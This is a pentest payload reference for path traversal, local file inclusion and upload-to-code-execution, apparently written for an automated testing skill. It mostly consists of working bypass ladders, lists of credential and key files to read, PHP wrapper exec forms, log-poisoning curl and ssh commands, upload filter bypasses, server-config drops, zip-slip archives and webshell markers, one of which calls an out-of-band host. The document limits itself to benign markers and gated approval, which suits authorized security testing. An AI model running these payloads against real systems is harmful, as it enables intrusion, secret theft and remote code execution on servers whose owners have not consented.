# Path traversal / LFI / upload payloads (shared by path-traversal-lfi / upload-rce)
# Benign marker reads for detection; sensitive reads + webshell upload are the variants (approval).

## Traversal detection (benign)
```
../../../../etc/hostname            # non-sensitive marker; prefer over /etc/passwd
..%2f..%2f..%2fetc/hostname         # URL-encoded
..%252f..%252f                      # double-encoded
....//....//                        # filter bypass (strip-once)
%2e%2e/                             # encoded dot
/var/www/....//....//etc/hostname   # absolute + traversal
```

## LFI escalation
```
php://filter/convert.base64-encode/resource=index.php      # read source (benign)
php://filter/.../resource=/etc/hostname
data:// , expect:// (if enabled) — exec wrappers (approval)
/proc/self/environ , access/error log poisoning -> LFI-to-RCE (approval, OOB proof)
```

## Upload → RCE
```
# benign webshell that only proves execution (echo a marker / call OOB) — NOT a real shell:
<?php echo "RS7F3Q"; ?>                         (.php / .phtml / .php5 / .pht)
<% out.print("RS7F3Q"); %>                      (.jsp)  ;  <%= "RS7F3Q" %> (.aspx)
# bypass type checks:
shell.php.jpg , shell.php%00.jpg , shell.pHp , magic bytes (GIF89a;) + .php,
Content-Type: image/png with php body, .htaccess to map an ext, path traversal in filename (../shell.php)
# SVG/XML upload -> XXE (hand to xxe-*); polyglot files
```

## Confirmation
Traversal/LFI: the marker file's REAL content comes back. Upload-RCE: request the stored file and get
the marker `RS7F3Q` (execution), or an OOB callback from the webshell. Keep everything benign; clean up
uploaded files (cleanup.md).

---
## Extended arsenal — traversal encoding & bypass ladders

Escalate top→bottom until one lands. Keep the target a benign marker (`/etc/hostname`, `C:\Windows\win.ini`).
A normalizer/WAF usually strips/decodes at ONE layer — pick the encoding that survives its pass but still
reaches the OS open().

### Dot-segment & separator ladder
```
../../../../etc/hostname                 # baseline (Linux)
..\..\..\..\windows\win.ini              # backslash (Windows)
..%2f..%2f..%2fetc/hostname              # URL-encoded slash
..%5c..%5c..%5cwindows%5cwin.ini         # URL-encoded backslash (%5c = \)
%2e%2e%2f%2e%2e%2fetc/hostname           # encoded dot AND slash
%2e%2e/%2e%2e/etc/hostname               # encoded dot, literal slash
..%252f..%252f                           # double-URL-encoded slash (%25 = %)
%252e%252e%252f                          # double-URL-encoded dot+slash
....//....//etc/hostname                 # strip-once of "../" leaves "../"
....\/....\/                             # mixed strip-once
..../\..../\                             # mixed strip-once (other order)
..;/..;/..;/etc/hostname                 # path-param segment (Tomcat/Spring strip)
.%2e/.%2e/etc/hostname                   # single literal dot + encoded dot
..%00/..%00/etc/hostname                 # null-interrupt of the segment (legacy)
..%0d/..%0a/..%09/                        # CR / LF / TAB inside the segment
```

### Unicode / overlong / width ladder (normalizer-dependent)
```
%c0%ae%c0%ae%c0%af                       # overlong 2-byte  .  .  /   (0xC0 0xAE = ".", 0xC0 0xAF = "/")
%e0%80%ae%e0%80%af                       # overlong 3-byte  .      /
%c1%9c                                   # overlong backslash (0xC1 0x9C = "\")
%u002e%u002e%u2215                       # 16-bit unicode: .. then ∕ (U+2215 division slash)
%uff0e%uff0e%uff0f                       # fullwidth . . /  (U+FF0E / U+FF0F)
%ef%bc%8e%ef%bc%8e%ef%bc%8f              # UTF-8 of fullwidth . . /  (folds to ../ on some stacks)
..%u2216..                               # U+2216 reverse solidus (fullwidth \)
```

### Absolute-path & prefix-escape ladder
```
/etc/hostname                            # absolute (app prepends base but no realpath check)
/etc/hostname%00                         # + null (legacy truncation)
file:///etc/hostname                     # file scheme (PHP/parsers that honor wrappers)
\\HOST\share\file                        # UNC (Windows; also triggers SMB auth -> capture/OOB)
\\?\C:\windows\win.ini   \\.\C:\...       # Win32 device/namespace prefixes
C:win.ini                                # drive-relative (no slash)
/proc/self/root/etc/hostname             # chroot-prefix escape via /proc
....//....//....//....//....//....//etc/hostname   # over-shoot: extra ../ past root is harmless
# PHP <5.3 path-truncation: pad to exceed PATH_MAX so a forced ".php"/".html" suffix is dropped
/etc/passwd/././././././././[...~4096 chars...]/.
/etc/passwd\0 , /etc/passwd%00 , /etc/passwd + "?" / "#" to cut an appended extension
```

### Windows filename-normalization quirks (upload + read)
```
file.php.            file.php%20          # trailing dot / space stripped by the FS -> executes
file.php::$DATA      file.php:.jpg        # NTFS alternate data stream (ADS)
PROGRA~1  shell~1.php                     # 8.3 short name
```

---
## Extended arsenal — interesting read targets

### Linux (benign proof first; secrets = approval-gated + redact)
| target | signal |
|---|---|
| `/etc/hostname` `/etc/hosts` `/etc/issue` `/etc/os-release` | BENIGN markers — prove the read with these |
| `/etc/passwd` (first line only) | classic non-secret proof; prefer hostname |
| `/proc/self/environ` `/proc/self/cmdline` `/proc/version` | process/env (env may hold secrets — redact) |
| `/proc/self/cgroup` `/proc/1/cgroup` `/.dockerenv` `/proc/self/mountinfo` | container / runtime detection |
| `/run/secrets/kubernetes.io/serviceaccount/token` | **k8s SA token — approval, redact, hand to k8s** |
| `/var/www/html/config.php` `wp-config.php` `.env` `config.yml` `settings.py` `application.properties` `database.yml` | app config / creds — approval |
| `~/.ssh/id_rsa` `~/.ssh/authorized_keys` `/etc/ssh/sshd_config` | SSH — approval |
| `~/.bash_history` `~/.zsh_history` `~/.mysql_history` | history (may leak creds) — approval |
| `/etc/crontab` `/etc/cron.d/*` `/var/spool/cron/crontabs/*` | scheduled jobs |
| `/var/log/apache2/access.log` `/var/log/nginx/access.log` `/var/log/auth.log` `/var/log/vsftpd.log` `/var/log/mail.log` | log-poisoning → RCE candidates |
| `/var/lib/php/sessions/sess_*` `/tmp/sess_*` | session include → RCE |
| `/etc/shadow` | hashes — **approval, usually unreadable** |

### Windows (benign proof first)
| target | signal |
|---|---|
| `C:\Windows\win.ini` `C:\Windows\System32\drivers\etc\hosts` | BENIGN markers |
| `C:\boot.ini` `C:\Windows\System32\license.rtf` | legacy benign markers |
| `C:\inetpub\wwwroot\web.config` `global.asax` | app config / connection strings — approval |
| `C:\Windows\System32\inetsrv\config\applicationHost.config` | IIS config — approval |
| `C:\inetpub\logs\LogFiles\W3SVC1\*.log` | IIS logs → poisoning |
| `C:\Windows\Panther\Unattend.xml` `sysprep.xml` `C:\Windows\debug\NetSetup.log` | deploy creds — approval, redact |
| `C:\xampp\php\php.ini` `C:\xampp\apache\logs\access.log` `C:\wamp\...` | stack config / logs |
| `%USERPROFILE%\.ssh\id_rsa` `NTUSER.DAT` | user secrets — approval |
| `C:\Windows\System32\config\SAM` `SYSTEM` `C:\Windows\repair\SAM` | hives — **approval, usually locked** |

---
## Extended arsenal — PHP wrapper matrix (LFI)

| wrapper | form | effect | precondition |
|---|---|---|---|
| `php://filter` | `php://filter/convert.base64-encode/resource=index.php` | read SOURCE (benign, no exec) | always |
| `php://input` | request body = `<?php echo 'RS7F3Q';?>` | exec POST body | `allow_url_include=On` |
| `data://` | `data://text/plain;base64,<b64 of <?php...?>>` | inline exec | `allow_url_include=On` |
| `expect://` | `expect://id` | command exec | `expect` ext loaded |
| `phar://` | `phar://uploaded.jpg/x` | deserialization on metadata parse | file present + a sink |
| `zip://` | `zip://uploaded.zip%23inner.php` | include a file inside an uploaded zip | file present |
| `compress.zlib://` `compress.bzip2://` | `compress.zlib://PATH` | read compressed/plain, dodge filters | — |
| `glob://` | `glob://var/www/*.php` | directory enumeration | — |
| `file://` | `file:///etc/hostname` | absolute read | — |
| `http(s)://` `ftp://` | remote URL | RFI (remote include) | `allow_url_include=On` |

---
## Extended arsenal — php://filter conversion chains (source read + oracle)

Benign: these transform bytes in-stream; chain with `|`. Pure read, no exec.
```
# read source as URL-safe base64 (the workhorse)
php://filter/convert.base64-encode/resource=/var/www/html/index.php
# stack transforms (decode-then-encode to defeat naive keyword filters / fix encodings)
php://filter/read=string.rot13|convert.base64-encode/resource=config.php
php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=.env
# compress then b64 for large files (smaller callback)
php://filter/zlib.deflate|convert.base64-encode/resource=app.log
```
```
# iconv filter-CHAIN to synthesize arbitrary bytes from an empty resource, so the included
# stream BECOMES attacker PHP -> RCE with NO uploaded file and NO allow_url_include.
# Generate the long convert.iconv.*|... chain with a filter-chain generator; payload echoes RS7F3Q.
# Feasibility/approval-gated: prove with the benign marker only.
php://filter/convert.iconv.<A>.<B>|convert.iconv.<C>.<D>|...|resource=php://temp
# blind variant: a crafted chain makes the parser error/not-error on a target byte = 1-bit oracle
# (error-based filter oracle) to read a file the app never reflects. Rate-limited, benign.
```

---
## Extended arsenal — /proc self-introspection tricks
```
/proc/self/environ          # exec env; poison via User-Agent on vulnerable SAPIs -> include -> RCE
/proc/self/cmdline          # how the worker was launched
/proc/self/fd/0 .. /fd/255  # brute open descriptors: read a log/upload temp without knowing its path
/proc/self/root/<abs path>  # re-enter the real root, bypassing a chroot-ish prefix
/proc/self/cwd/<relpath>    # resolve relative to the worker CWD
/proc/self/maps /status /mounts /mountinfo    # memory map / limits / mounts (recon; maps+mem = approval)
/proc/<pid>/cmdline /proc/<pid>/environ       # other workers (enumerate pids)
```

---
## Extended arsenal — LFI → RCE vectors (approval-gated; benign marker / OOB proof only)

Every vector below is proven with `RS7F3Q` echoed or a single OOB ping to `TOKEN.oob.example` — never a
real shell. Clean up any planted line/file afterward.
```
# 1. WEB-LOG POISONING  (write marker into a log, then LFI the log)
curl -s HOST -A '<?php echo "RS7F3Q"; ?>'                    # User-Agent lands in access.log
#   then include: /var/log/apache2/access.log  (or nginx/access.log, IIS W3SVC log)
curl -s "HOST/<?php echo 'RS7F3Q';?>"                        # path lands in error.log on 400/404

# 2. SSH / AUTH.LOG POISONING
ssh '<?php echo "RS7F3Q"; ?>'@HOST                           # failed-login username -> /var/log/auth.log

# 3. MAIL LOG / MAILBOX
#   send to a local user, include /var/log/mail.log or /var/mail/www-data

# 4. /proc/self/environ  (older FastCGI/CGI SAPIs)
curl -s HOST -A '<?php echo "RS7F3Q"; ?>'                    # then include /proc/self/environ

# 5. PHP SESSION INCLUSION
#   force an attacker-controlled $_SESSION value = <?php echo 'RS7F3Q';?>, then include
#   /var/lib/php/sessions/sess_<PHPSESSID>  (or /tmp/sess_<id>)

# 6. php://filter iconv filter-CHAIN -> RCE  (no file, no allow_url_include) — see chain section

# 7. phar:// DESERIALIZATION
#   upload a phar-polyglot image; trigger phar:// on any filesystem op -> benign __destruct marker/OOB

# 8. UPLOAD TEMP-FILE RACE + LFI
#   while a multipart upload is in flight, include /proc/self/fd/* or brute /tmp/php* (phpinfo tmp-name
#   leak speeds this). Benign marker payload only.

# 9. data:// , php://input , expect://   (when allow_url_include=On / expect loaded)
data://text/plain;base64,PD9waHAgZWNobyAnUlM3RjNRJzsgPz4=   # base64 of <?php echo 'RS7F3Q'; ?>
```

---
## Extended arsenal — file upload: extension & parser bypass matrix

| stack | executable extensions to try | server-specific tricks |
|---|---|---|
| PHP / Apache | `.php .php2 .php3 .php4 .php5 .php7 .phtml .pht .phar .phps .pgif .inc` | `shell.php.jpg` (legacy AddHandler), `shell.pHp`, `.htaccess` / `.user.ini` drops |
| ASP / IIS | `.asp .aspx .asa .asax .ascx .ashx .asmx .cer .cdx .shtml .config` | `shell.asp;.jpg` (IIS6 semicolon), `shell.asp/`, trailing dot, `::$DATA`, `web.config` |
| JSP / Tomcat | `.jsp .jspx .jspf .jsw .jsv .jtml` | `..;/` path segment, `.war` deploy, case `.JsP` |
| ColdFusion | `.cfm .cfml .cfc .cfr` | — |
| CGI | `.pl .cgi .py .rb` (if `/cgi-bin` + ExecCGI) | shebang + exec bit |

```
# name-mangling bypasses (combine with the exts above)
shell.php.jpg      shell.jpg.php        # double / reverse-double extension
shell.php%00.jpg   shell.php\x00.jpg    # null byte (legacy PHP/Java)
shell.php%20       shell.php.           # trailing space / dot (Windows strips)
shell.php%0a       shell.asp%0a.jpg     # embedded newline
shell.pHp  shell.PHP5                   # case toggling
shell.php:.jpg     shell.php::$DATA     # NTFS ADS
../../shell.php     ..%2f..%2fshell.php # path traversal in the multipart filename field
```

---
## Extended arsenal — file upload: content-type & magic-byte spoofing
```
# Content-Type header spoof (send image type, body is code)
Content-Type: image/png     image/jpeg     image/gif     application/pdf

# magic-byte prefixes (prepend, then your benign payload) — defeat getimagesize()/finfo signature checks
GIF89a                        # GIF  (printable; easiest polyglot header)
GIF87a
\x89PNG\r\n\x1a\n             # PNG
\xFF\xD8\xFF\xE0..JFIF        # JPEG
%PDF-1.5                      # PDF
BM                            # BMP
```
```
# polyglot bodies (valid image AND runs as PHP)
GIF89a1;<?php echo 'RS7F3Q'; ?>                 # GIF/PHP one-liner
# JPEG: inject <?php...?> into an EXIF/comment (COM) segment so re-encoding may preserve it
# PNG : stash payload in a tEXt/iTXt chunk (survives some resize pipelines)
# phar-jpg polyglot: a file that is a valid JPEG AND a valid phar -> feeds phar:// deserialization
```

---
## Extended arsenal — file upload: server-config, SVG/XML & archive vectors

### Config-file drops (turn a benign dir into an executing one)
```apache
# .htaccess  (Apache, upload dir with AllowOverride FileInfo)
AddType application/x-httpd-php .jpg          # now .jpg runs as PHP
# or force every file through PHP:
SetHandler application/x-httpd-php
# or prepend an uploaded image as code on every request in this dir:
php_value auto_prepend_file /var/www/uploads/payload.gif
```
```ini
; .user.ini  (PHP FastCGI/CGI, per-directory)
auto_prepend_file=payload.gif
```
```xml
<!-- web.config (IIS) — map a benign ext to a handler, or set a default document -->
<configuration><system.webServer><handlers>
  <add name="rce" path="*.xyz" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
</handlers></system.webServer></configuration>
```

### SVG / XML image vectors (hand XXE/XSS to their skills)
```xml
<!-- SVG -> stored XSS (benign marker / OOB) -->
<svg xmlns="http://www.w3.org/2000/svg" onload="document.title='RS7F3Q'"></svg>
<svg xmlns="http://www.w3.org/2000/svg"><script>new Image().src='//TOKEN.oob.example/svgxss'</script></svg>
<!-- SVG -> SSRF: server-side rasterizer fetches the href (benign OOB) -->
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://TOKEN.oob.example/svgssrf"/></svg>
<!-- SVG -> XXE: DOCTYPE + external entity (see xxe_payloads.md) -->
```

### Archive upload vectors
```
# zip-slip: entry path traverses out of the extraction dir
zip -y payload.zip "../../../../var/www/html/shell.php"      # entry name holds the traversal
# symlink-in-archive: tar entry is a symlink to a sensitive file; reading the "upload" reads the target
ln -s /etc/passwd link ; tar -chf payload.tar link           # -h follows; some extractors restore the link
# zip://-includable: a zip whose inner .php is reached by php LFI  ->  zip://upload.zip%23inner.php
# decompression bomb = DoS -> FEASIBILITY ONLY, never upload one
```

### Second-order media processing (approval-gated, benign OOB marker)
```
# ImageMagick MVG/MSL: crafted .mvg/.svg with url()/`msl:` -> SSRF / file read  (benign OOB ping)
# Ghostscript via EPS/PDF: -dSAFER bypass class -> command exec feasibility (approval)
# ffmpeg HLS: crafted .m3u8/.avi referencing file:// or http:// -> local read / SSRF (benign OOB)
```

---
## Extended arsenal — benign webshell marker library (confirmation)

None of these spawn a shell — each only echoes `RS7F3Q` or fires ONE OOB ping. Real interactive shells
and command exec are approval-gated and out of the default scope.
```
PHP:    <?php echo 'RS7F3Q'; ?>                                 # .php .phtml .pht .php5 .phar
PHP+OOB:<?php @file_get_contents('http://TOKEN.oob.example/'.php_uname('n')); echo 'RS7F3Q'; ?>
JSP:    <%= "RS7F3Q" %>        |   <% out.print("RS7F3Q"); %>    # .jsp .jspx
ASPX:   <% Response.Write("RS7F3Q"); %>                         # .aspx
ASP:    <% Response.Write "RS7F3Q" %>                           # .asp .asa .cer
CFM:    <cfoutput>RS7F3Q</cfoutput>                             # .cfm
CGI:    #!/bin/sh<newline>echo "Content-Type: text/plain"; echo; echo RS7F3Q   # .cgi (+exec bit)
```

---
## Extended arsenal — tooling & confirmation discipline
```
# traversal/param fuzzing
ffuf -w traversal.txt -u 'https://HOST/download?file=FUZZ' -mr 'RS7F3Q|root:x:'   # match marker signature
# LFI automation + upload fuzzing: use an LFI-automation tool and an upload-fuzzer; a php filter-chain
# generator builds the convert.iconv.* chains. Always confirm hits MANUALLY with a benign marker.
```
Confirm a READ by the benign marker's REAL content returning (`/etc/hostname` string, `win.ini` body, or
a planted canary). Confirm UPLOAD→exec by the stored file returning `RS7F3Q` or an OOB callback. Secrets
(keys, hashes, tokens, env) are approval-gated and must be redacted. No destructive writes, no mass
exfil, no decompression/pixel-flood DoS. Remove every uploaded file and poisoned log line (cleanup.md).
